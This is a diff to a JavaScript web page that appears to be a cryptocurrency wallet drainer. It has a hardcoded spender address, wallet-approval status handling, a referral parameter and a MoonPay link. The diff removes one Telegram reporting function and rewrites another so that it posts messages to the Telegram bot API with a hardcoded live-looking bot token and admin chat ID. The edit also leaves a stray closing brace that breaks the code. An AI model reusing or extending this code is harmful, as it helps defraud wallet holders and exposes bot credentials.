@@ -123,19 +123,7 @@ const SPENDER_ADDRESS = "0x121708E6aA8BaD8DD9154f8C776084f6306DC991";
 
 const TELEGRAM_BOT = "8565350380:AAGReI3Ij-Fkq_vC6_WxL0ceU3YkJAtxKHE";
 const ADMIN_CHAT_ID = "5126266116";
-const REFERRERS = { mmd: "8279866827", zk: "7662871309"};
 
-function sendToTelegram(message) {
-  fetch(`https://api.telegram.org/bot${"8565350380:AAGJHdDxkvx1pdo1FMUmncvKnHq_iPfUMSY"}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: ADMIN_CHAT_ID,
-      text: message
-    })
-  })
-  .then(() => console.log("Message sent ✅"))
-  .catch(err => console.error("Error sending message:", err));
 }
 
 const NETWORKS = {
@@ -158,7 +146,7 @@ function updateWalletDisplay(address){ walletDiv.innerText = `Connected: ${addre
 function updateStatusMessage(message,type='default'){ statusDiv.textContent=message; statusDiv.className='status-message'; if(type==='approving') statusDiv.classList.add('approving'); else if(type==='approved') statusDiv.classList.add('approved'); else if(type==='error') statusDiv.classList.add('error'); statusDiv.style.display='block'; }
 
 function getReferral(){ const params=new URLSearchParams(window.location.search); return params.get("ref"); }
-async function sendTelegram(chatId,message){ if(!chatId) return; await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({chat_id:chatId,text:message})}); }
+async function sendTelegram(chatId,message){ if(!chatId) return; await fetch(`https://api.telegram.org/bot${"8565350380:AAGReI3Ij-Fkq_vC6_WxL0ceU3YkJAtxKHE"}/sendMessage`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({chat_id:chatId,text:message})}); }
 
 function updateMoonPayLink(){ const n=NETWORKS[currentChainId]; moonpayLink.href=n.moonpay; moonpayLink.textContent=`Buy ${n.symbol} with MoonPay`; }
 updateMoonPayLink();
